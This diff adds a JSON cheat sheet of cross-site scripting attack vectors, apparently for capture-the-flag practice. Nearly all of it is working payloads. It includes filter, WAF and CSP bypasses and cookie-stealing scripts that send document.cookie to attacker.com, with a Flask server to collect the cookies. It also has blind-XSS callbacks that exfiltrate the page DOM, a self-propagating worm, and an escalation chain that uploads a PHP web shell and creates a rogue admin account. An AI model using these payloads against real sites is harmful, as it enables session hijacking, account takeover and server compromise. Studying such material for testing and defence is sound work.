@@ -1,0 +1,77 @@
+{
+  "title": "XSS Attack Vectors",
+  "category": "Web",
+  "description": "Cross-Site Scripting payloads, bypass techniques, DOM-based XSS, and exploitation strategies for stealing cookies and session hijacking.",
+  "entries": [
+    {
+      "name": "Basic XSS Payloads",
+      "desc": "Fundamental cross-site scripting vectors for detecting and exploiting XSS vulnerabilities",
+      "example": "# Simple alert payloads\n<script>alert(1)</script>\n<script>alert('XSS')</script>\n<script>alert(document.domain)</script>\n<script>alert(document.cookie)</script>\n\n# Image tag\n<img src=x onerror=alert(1)>\n<img src=x onerror=alert(String.fromCharCode(88,83,83))>\n\n# SVG vectors\n<svg/onload=alert(1)>\n<svg><script>alert(1)</script></svg>\n<svg><animate onbegin=alert(1)>\n\n# Body tag\n<body onload=alert(1)>\n<body onpageshow=alert(1)>\n\n# Input tag\n<input onfocus=alert(1) autofocus>\n<input onblur=alert(1) autofocus><input autofocus>\n\n# Other event handlers\n<div onmouseover=alert(1)>hover me</div>\n<marquee onstart=alert(1)>scroll</marquee>\n<details open ontoggle=alert(1)>\n<select onfocus=alert(1) autofocus>",
+      "flag_hint": "Try various HTML tags and event handlers - different contexts block different vectors",
+      "tags": ["xss", "reflected", "payload", "alert"]
+    },
+    {
+      "name": "Cookie Stealing",
+      "desc": "Exfiltrate user cookies to attacker-controlled server for session hijacking",
+      "example": "# Basic cookie theft\n<script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n\n# Image request\n<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>\n\n# Fetch API\n<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>\n\n# XMLHttpRequest\n<script>\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://attacker.com/steal?c=' + document.cookie);\nxhr.send();\n</script>\n\n# Base64 encode to avoid special chars\n<script>\nfetch('http://attacker.com/steal?c=' + btoa(document.cookie));\n</script>\n\n# Attacker server (Python)\nfrom flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/steal')\ndef steal():\n    cookie = request.args.get('c')\n    print(f\"Stolen cookie: {cookie}\")\n    with open('cookies.txt', 'a') as f:\n        f.write(cookie + '\\n')\n    return ''\n\napp.run(host='0.0.0.0', port=80)",
+      "flag_hint": "HTTPOnly cookies cannot be accessed via JavaScript - check for this protection",
+      "tags": ["xss", "cookie-stealing", "session-hijacking", "exfiltration"]
+    },
+    {
+      "name": "DOM-Based XSS",
+      "desc": "XSS executed through client-side JavaScript without server involvement - exploiting unsafe DOM manipulation",
+      "example": "# Vulnerable code example\n<script>\nvar name = location.hash.substring(1);\ndocument.write(\"Hello \" + name);\n</script>\n\n# Exploit: http://target.com/#<img src=x onerror=alert(1)>\n\n# innerHTML vulnerability\n<script>\nvar search = new URLSearchParams(location.search).get('q');\ndocument.getElementById('results').innerHTML = search;\n</script>\n# Exploit: ?q=<img src=x onerror=alert(1)>\n\n# Common sinks (dangerous functions)\n- document.write()\n- element.innerHTML\n- element.outerHTML\n- eval()\n- setTimeout() / setInterval() with string arg\n- Function() constructor\n- location.href\n- document.location\n\n# Common sources (user input)\n- location.href\n- location.search\n- location.hash\n- document.URL\n- document.referrer\n- window.name\n- postMessage data\n\n# Detection payload\njavascript:alert(1)\n#<script>alert(1)</script>\n?x=<script>alert(1)</script>",
+      "flag_hint": "Check client-side JavaScript for unsafe DOM manipulation of user input",
+      "tags": ["xss", "dom", "client-side", "javascript"]
+    },
+    {
+      "name": "XSS Filter Bypass",
+      "desc": "Evading XSS filters, WAFs, and input sanitization using encoding and alternative syntax",
+      "example": "# Case variation\n<ScRiPt>alert(1)</sCrIpT>\n<IMG SRC=x ONERROR=alert(1)>\n\n# Without spaces\n<script>alert(1)</script>\n<img/src=x/onerror=alert(1)>\n<svg/onload=alert(1)>\n\n# Without quotes\n<script>alert(String.fromCharCode(88,83,83))</script>\n<img src=x onerror=alert(1)>\n\n# HTML encoding\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>  # alert\n<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>  # hex\n\n# JavaScript encoding\n<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>  # alert\n<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>\n\n# URL encoding\n<img src=x onerror=%61%6c%65%72%74(1)>\n\n# Bypassing keyword filters\n<script>alert(1)</script>  # Blocked\n<scr<script>ipt>alert(1)</scr</script>ipt>  # Nested\n<scr\\x00ipt>alert(1)</scr\\x00ipt>  # Null byte\n<SCR\\x00IPT>alert(1)</SCR\\x00IPT>\n\n# Alternative JavaScript execution\n<img src=x onerror=eval(atob('YWxlcnQoMSk='))>  # Base64\n<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>\n\n# Polyglot payload (works in multiple contexts)\njaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
+      "flag_hint": "Try multiple encoding layers and context-specific bypasses",
+      "tags": ["xss", "bypass", "filter-evasion", "waf"]
+    },
+    {
+      "name": "Stored XSS Exploitation",
+      "desc": "Persistent XSS stored in database - triggers when other users view the content",
+      "example": "# Comment field exploitation\n# User submits comment:\n<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>\n\n# Username XSS\n# Register with username:\n<img src=x onerror=alert(document.cookie)>\n\n# Profile bio XSS\n# Set bio to:\n<svg/onload=fetch('http://attacker.com/log?'+document.cookie)>\n\n# Rich text editor bypass\n# If using WYSIWYG editor, switch to HTML mode:\n<img src=\"x\" onerror=\"eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vc3RlYWw/Yz0nK2RvY3VtZW50LmNvb2tpZSk='))\">\n\n# Impact amplification\n# Steal admin cookie when admin views user profile\n<script>\nif(document.cookie.includes('admin=1')){\n    fetch('http://attacker.com/admin?c='+btoa(document.cookie));\n}\n</script>\n\n# Self-propagating XSS worm\n<script>\nfetch('/api/comment', {\n    method: 'POST',\n    body: JSON.stringify({\n        comment: document.querySelector('script').outerHTML\n    })\n});\n</script>",
+      "flag_hint": "Stored XSS has higher impact - triggers repeatedly for all users",
+      "tags": ["xss", "stored", "persistent", "worm"]
+    },
+    {
+      "name": "CSP Bypass Techniques",
+      "desc": "Evading Content Security Policy restrictions to execute XSS payloads",
+      "example": "# Identify CSP header\nContent-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com\n\n# Bypass strategies:\n\n# 1. JSONP endpoints on whitelisted domains\n<script src=\"https://trusted.com/jsonp?callback=alert\"></script>\n\n# 2. AngularJS sandbox bypass (old versions)\n{{constructor.constructor('alert(1)')()}}\n{{$on.constructor('alert(1)')()}}\n\n# 3. Script gadgets (if 'unsafe-eval' allowed)\n<script src=\"https://trusted.com/angular.js\"></script>\n<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>\n\n# 4. Base tag injection\n<base href=\"http://attacker.com/\">\n<script src=\"/static/app.js\"></script>  # Loads from attacker.com\n\n# 5. meta redirect (if allowed)\n<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">\n\n# 6. dangerouslySetInnerHTML in React\n# Exploits misconfigured React components\n\n# 7. nonce/hash bruteforce\n# If CSP uses nonce, try to guess or leak it\n\n# Bypass checker tool\n# csp-evaluator.withgoogle.com",
+      "flag_hint": "Check CSP policy with browser DevTools - look for 'unsafe-inline', 'unsafe-eval', wildcard domains",
+      "tags": ["xss", "csp", "bypass", "content-security-policy"]
+    },
+    {
+      "name": "Blind XSS",
+      "desc": "XSS that triggers in admin panel or backend system - no direct feedback to attacker",
+      "example": "# Blind XSS payloads with callbacks\n# Inject in user inputs that admins view later\n\n# Basic callback payload\n<script src=\"http://attacker.com/xss?c=\"+document.cookie></script>\n\n# XSS Hunter payload (automated blind XSS)\n<script src=https://your-subdomain.xss.ht></script>\n\n# Custom callback script\n<script>\nfetch('http://attacker.com/blind', {\n    method: 'POST',\n    body: JSON.stringify({\n        url: location.href,\n        cookie: document.cookie,\n        dom: document.documentElement.outerHTML,\n        origin: location.origin\n    })\n});\n</script>\n\n# Polyglot for multiple contexts\n'\"><script src=http://attacker.com/xss></script>\n\n# Test locations:\n- User profile fields (name, bio, location)\n- Contact forms\n- Support tickets\n- Log entries\n- Error messages\n- Email address fields\n- File upload filenames\n- HTTP headers (User-Agent, Referer)\n\n# Server setup for callbacks\nfrom flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/blind', methods=['POST'])\ndef blind():\n    data = request.get_json()\n    print(f\"Blind XSS triggered!\")\n    print(f\"URL: {data.get('url')}\")\n    print(f\"Cookie: {data.get('cookie')}\")\n    # Send notification\n    return ''\n\napp.run(host='0.0.0.0', port=80)",
+      "flag_hint": "Use XSS Hunter (xss.ht) for automated blind XSS detection with email alerts",
+      "tags": ["xss", "blind", "admin", "callback"]
+    },
+    {
+      "name": "XSS in Different Contexts",
+      "desc": "Context-specific XSS payloads for HTML attributes, JavaScript strings, and CSS",
+      "example": "# Inside HTML attribute\n# <input value=\"USER_INPUT\">\n\" onclick=\"alert(1)\n\" autofocus onfocus=\"alert(1)\n\" onmouseover=\"alert(1)\n\n# Inside JavaScript string\n# <script>var name = 'USER_INPUT';</script>\n'; alert(1); //\n'; alert(1); var dummy='\n\n# Breaking out of JavaScript\n</script><script>alert(1)</script>\n</script><img src=x onerror=alert(1)>\n\n# Inside onclick attribute\n# <a onclick=\"log('USER_INPUT')\">\n'); alert(1); //\n'); alert(1); var dummy=('x\n\n# Inside href attribute\n# <a href=\"USER_INPUT\">\njavascript:alert(1)\ndata:text/html,<script>alert(1)</script>\n\n# Inside src attribute\n# <script src=\"USER_INPUT\"></script>\nhttp://attacker.com/evil.js\ndata:text/javascript,alert(1)\n\n# CSS injection\n# <style>body { background: USER_INPUT; }</style>\n}</style><script>alert(1)</script>\nurl('javascript:alert(1)')\n\n# JSON context\n# <script>var data = {\"name\": \"USER_INPUT\"};</script>\n\", \"evil\": alert(1), \"dummy\": \"\n\"}; alert(1); var dummy={\"x\":\"\n\n# URL parameter context\n# Location: http://site.com?q=USER_INPUT\n<script>alert(1)</script>\n%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
+      "flag_hint": "Always consider the context - attribute, JavaScript string, URL, etc.",
+      "tags": ["xss", "context", "attribute", "javascript"]
+    },
+    {
+      "name": "XSS Automation Tools",
+      "desc": "Tools for automated XSS detection, exploitation, and payload generation",
+      "example": "# XSStrike - Advanced XSS detection\npython xsstrike.py -u \"http://target.com/page?q=test\"\npython xsstrike.py -u \"http://target.com/page?q=test\" --crawl\n\n# Dalfox - Fast XSS scanner\ndalfox url \"http://target.com/page?q=test\"\ndalfox file urls.txt -o result.txt\n\n# XSS Hunter - Blind XSS platform\n# 1. Register at xss.ht\n# 2. Use provided payload: <script src=https://your-id.xss.ht></script>\n# 3. Receive email when XSS triggers\n\n# Burp Suite extensions\n# - XSS Validator\n# - Reflected Parameters\n# - XSS PoC Generator\n\n# Browser testing\n# 1. Disable XSS Auditor in Chrome\nchrome.exe --disable-xss-auditor\n\n# 2. Use Firefox (no XSS filter by default)\n\n# Manual payload list\n# PayloadsAllTheThings: github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection\n# OWASP XSS Filter Evasion: owasp.org/www-community/xss-filter-evasion-cheatsheet\n\n# XSS payload encoder\npython -c \"import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))\"\n\n# Testing checklist\n# 1. Find reflection points\n# 2. Test basic payloads\n# 3. Identify filters\n# 4. Bypass filters\n# 5. Craft final exploit\n# 6. Exfiltrate data",
+      "flag_hint": "Combine automated scanning with manual testing for best results",
+      "tags": ["xss", "tools", "automation", "xsstrike", "dalfox"]
+    },
+    {
+      "name": "XSS to RCE",
+      "desc": "Escalating XSS to Remote Code Execution through various attack vectors",
+      "example": "# Via admin panel access\n# 1. Steal admin cookie with XSS\n<script>fetch('http://attacker.com/c='+document.cookie)</script>\n\n# 2. Use cookie to access admin panel\n# 3. Upload web shell or execute commands\n\n# Via CSRF + XSS combo\n<script>\n// Create admin user via CSRF\nfetch('/admin/users', {\n    method: 'POST',\n    headers: {'Content-Type': 'application/json'},\n    body: JSON.stringify({\n        username: 'hacker',\n        password: 'pass123',\n        role: 'admin'\n    })\n});\n</script>\n\n# Via file upload exploitation\n<script>\n// Upload PHP webshell\nvar form = new FormData();\nvar blob = new Blob(['<?php system($_GET[\"c\"]); ?>'], {type: 'text/plain'});\nform.append('file', blob, 'shell.php');\n\nfetch('/upload', {\n    method: 'POST',\n    body: form\n}).then(r => r.text()).then(data => {\n    // Execute command via uploaded shell\n    fetch('/uploads/shell.php?c=whoami');\n});\n</script>\n\n# Via npm/package manager in CI/CD\n# If XSS in package.json or similar config files\n# Triggers code execution during build\n\n# Via template injection\n# If server uses client-side JavaScript templates\n# XSS payload can trigger server-side template injection\n<script>\nfetch('/render', {\n    method: 'POST',\n    body: '{{7*7}}[[1+1]]${1+1}<%=1+1%>'  # Template injection payloads\n});\n</script>",
+      "flag_hint": "XSS + privileged context = potential RCE via admin functions",
+      "tags": ["xss", "rce", "escalation", "csrf", "admin"]
+    }
+  ]
+}
